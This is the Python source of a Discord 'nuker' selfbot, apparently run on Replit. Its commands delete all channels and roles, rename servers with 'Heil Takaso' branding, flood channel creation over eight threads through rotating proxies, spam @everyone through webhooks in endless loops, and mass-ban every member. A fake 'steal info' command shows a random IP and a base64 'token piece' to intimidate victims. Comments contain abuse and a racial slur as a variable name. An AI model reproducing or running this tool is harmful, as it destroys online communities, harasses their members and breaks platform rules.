

import os
# Hello, if you came here, I don't know how you find this repl
# But don't fork this project nor skid it, if you do you're a fucking skidlord
# I made it only for myself, I won't accept a useless skid who
# forks my projects and takes credits for my work.

import discord, requests
from discord.ext import commands
import asyncio
import random
import time
import threading
import aiohttp
import proxygen
from itertools import cycle
import replit
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
import json
import base64


default_token = os.environ['defeault_token']
usertoken = input("Insert your token > ")
if usertoken == "cazzo":
  usertoken = default_token

prefix = "%"

Answers = ["Yes", "ye", "yes", "YeS", "YEs", "YES", "yEs", "yeS", "yeah", "Yeah", "Yep", "yep", "YE", "Ye", "yE", "y", "Y"]

account_type = input("\n%s[!] Warning [!]%s\n%sAre you using an account token?%s %sYes/No%s > " % (yellow(), reset(), magenta(), reset(), green(), reset()))


replit.clear()

if account_type in Answers:
    try:
        slayer = commands.Bot(prefix, self_bot=True)
        slayer.remove_command("help")
        headers = {
          "Authorization": usertoken
          }
    except:
      pass
else:
    try:
        intenzioni = input("\n%s[!]%s You have choosen a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
        if intenzioni in Answers:
            intents = discord.Intents().all()
            slayer = commands.Bot(prefix, intents=intents)
            slayer.remove_command("help")
            headers = {
                "authorization": f"Bot {usertoken}"
                }
        else:
            slayer = commands.Bot(prefix)
            slayer.remove_command("help")
            headers = {
                "authorization": f"Bot {usertoken}"
                }
    except:
        pass


checkweb = False
proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)
proxy = next(proxy_pool)

@slayer.event
async def on_ready():
  print("\nSuccesfully connected.")


thechans = []
@slayer.command()
async def nuke(ctx):
    global checkweb
    global serwer
    checkweb = True
    extrapayload = {
        "banner": "null",
        "icon": "null",
    }
    serwer = str(ctx.guild.id)
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    try:
        await guild.edit(name="Nuked by AOS and UAG | Heil Takaso")
    except:
        pass
    try:
        r = requests.patch(f"https://canary.discord.com/api/v9/guilds/{serwer}", headers=headers, json=extrapayload)
    except:
        pass
    for channel in guild.channels:
        thechans.append(channel.id)
    try:
        await deleteall()
    except:
        pass
    try:
        threadchan()
    except:
        pass
    try:
        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
        asyncio.gather(*roletasks)
    except:
        pass

channel_names = ["Hacked by Takaso", "Heil AOS", "sus"]


##########################################################################################

# Extra Command I made to test the channel delete

@slayer.command()
async def tester(ctx, amount = 100, *, name = None):
  try:
      await ctx.message.delete()
  except:
      pass
  if name == None:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print("aaaaa")
        return
      except:
        pass
  else:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print("cazzo")
        return
      except:
        pass



async def deleteroles(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass

async def rolenuke(ctx):
    for x in range(500):
        try:
            await ctx.guild.create_role(name="Nuked by AOS and UAG, Heil Takaso")
        except:
            pass

@slayer.command()
async def lastcheck(ctx):
    for channel in ctx.guild.channels:
        if channel.name != "heil-aos":
            try:
                await channel.delete()
            except:
                pass

#########################################################################################

@slayer.command()
async def load(ctx, ID):
    await ctx.message.delete()
    progress = [
     "1% - 〔█                              〕",
     "3% - 〔██                             〕",
     "6% - 〔███                            〕",
     "9% - 〔████                           〕",
     "12% -〔█████                          〕",
     "15% -〔██████                         〕",
     "18% -〔███████                        〕",
     "21% -〔███████                        〕",
     "22% -〔███████                        〕",
     "24% -〔████████                       〕",
     "26% -〔█████████                      〕",
     "29% -〔██████████                     〕",
     "31% -〔███████████                    〕",
     "36% -〔████████████                   〕",
     "41% -〔█████████████                  〕",
     "43% -〔██████████████                 〕",
     "46% -〔███████████████                〕",
     "49% -〔████████████████               〕",
     "50% -〔████████████████               〕",
     "52% -〔█████████████████              〕",
     "56% -〔██████████████████             〕",
     "59% -〔███████████████████            〕",
     "64% -〔████████████████████           〕",
     "69% -〔█████████████████████          〕",
     "71% -〔██████████████████████         〕",
     "74% -〔███████████████████████        〕",
     "79% -〔████████████████████████       〕",
     "82% -〔█████████████████████████      〕",
     "86% -〔██████████████████████████     〕",
     "89% -〔███████████████████████████    〕",
     "93% -〔████████████████████████████   〕",
     "93% -〔████████████████████████████   〕",
     "94% -〔█████████████████████████████  〕",
     "95% -〔█████████████████████████████  〕",
     "96% -〔█████████████████████████████  〕",
     "97% -〔█████████████████████████████  〕",
     "98% -〔██████████████████████████████ 〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     ]
    kkk = await ctx.send(f"```\nStarting the process to steal <@{ID}>'s info.\n```")
    bar = await ctx.send("```\n0% - 〔█                              〕\n```")
    for loads in progress:
        await bar.edit(content=f"""
```
[{loads}]
```
""")
    await kkk.delete()
    await bar.delete()
    IP1 = random.randint(0, 255)
    IP2 = random.randint(0, 255)
    IP3 = random.randint(0, 255)
    IP4 = random.randint(0, 255)
    sample_string = str(ID)
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    try:
        await ctx.send(f"""
```
Here's the Info:

IPv4: {IP1}.{IP2}.{IP3}.{IP4}
First piece of Token: {base64_string}
```
""")
    except:
        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))

    
@slayer.command()
async def purge(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=500).filter(
        lambda m: m.author == slayer.user
    ).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass


@slayer.command()
async def scrape_messages(ctx, ID = None):
    global Channel_ID
    Channel_ID = ID
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        s = await ctx.send("Insert an ID.")
        asyncio.sleep(4)
        await s.delete()
    try:
        message_scraper()
    except:
        pass

def message_scraper():
    global Channel_ID
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers)
    jsonn = json.loads(r.text)
    for value in jsonn:
        print(f"Name: {value['author']['username']}, Message: {value['content']}", "\n")

thechans = []
@slayer.command()
async def cdel(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    for channel in guild.channels:
        thechans.append(channel.id)
    await deleteall()

def get_chans(session):
    tasks = []
    for niggurs in thechans:
        try:
            tasks.append(session.delete(f"https://discord.com/api/v9/channels/{niggurs}", headers=headers))
        except:
            pass
    return tasks

async def deleteall():
    async with aiohttp.ClientSession() as session:
        tasks = get_chans(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass 


@slayer.command()
async def ccr(ctx):
    try:
        await ctx.messagge.delete()
    except:
        pass
    global serwer
    serwer = str(ctx.guild.id)
    threadchan()

def chanflood():
    payload = {
        "name": "heil aos and uag",
        "type": "0"
    }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/guilds/{serwer}/channels", headers=headers, json=payload, proxies={"http": proxy})
    except:
        pass

def threadchan():
    threads = []
    for i in range(8):
        t = threading.Thread(target=chanflood)
        threads.append(t)
        t.start()    


@slayer.event
async def on_guild_channel_create(channel):
  global checkweb
  if checkweb == True:
      webhook = await channel.create_webhook(name="Takaso")
      try:
          while True:
              await webhook.send(content=" > Nuked by **AOS** and **UAG**\n```py\n'Imagine having your surver fucked by Takaso LMAO'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
      except:
          pass

@slayer.command()
async def idinfo(ctx, *, ID = None):
    # HypeSquad function source: https://stackoverflow.com/questions/66951118/discord-py-showing-user-badges
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        await ctx.send("I forgot to put the ID.", delete_after=4)
    try:
        user = await slayer.fetch_user(ID)
    except:
        await ctx.send("Invalid ID.", delete_after=5)
    date_format = "%a, %d %b %Y %I:%M %p"
    hypesquad_class = str(user.public_flags.all()).replace('[<UserFlags.', '').replace('>]', '').replace('_',
                                                                                                         ' ').replace(
        ':', '').title()
    hypesquad_class = ''.join([i for i in hypesquad_class if not i.isdigit()])
    em=discord.Embed(title="**〓〓〚Info Card〛〓〓**", description=f"""
**Username**
```
{user.name}#{user.discriminator}
```
**Account Creation**
```
{user.created_at.strftime(date_format)}
```
**HypeSquad**
```
{hypesquad_class}
```
""", color=0xffff00)
    em.set_thumbnail(url=user.avatar_url)
    try:
        await ctx.send(embed=em, delete_after=15)
    except:
        print("\n[%s-%s] Failed to send message!" % (red()), reset())


themembers = []
@slayer.command()
async def massban(ctx):
    global guild2
    try:
        await ctx.message.delete()
    except:
        pass
    guild2 = ctx.guild.id
    guild = ctx.guild
    for members in guild.members:
        try:
            themembers.append(members.id)
            themembers.remove(slayer.user.id)
        except:
            pass
    await banall()

def get_members(session):
    tasks = []
    for server_members in themembers:
        try:
            tasks.append(session.put(f"https://discord.com/api/v9/guilds/{guild2}/bans/{server_members}", headers=headers))
        except:
            pass
    return tasks

async def banall():
    async with aiohttp.ClientSession() as session:
        tasks = get_members(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass



if account_type in Answers:
    try:
        slayer.run(usertoken, bot=False)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\n%sLooks like your token is invalid!%s" % (red(), reset()))
else:
    try:
        slayer.run(usertoken)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\nLooks like your %stoken%s is %sinvalid!%s" % (yellow(), reset(), red(), reset()))

fail = input("\n%sPress any key to exit%s > " % (red(), reset()))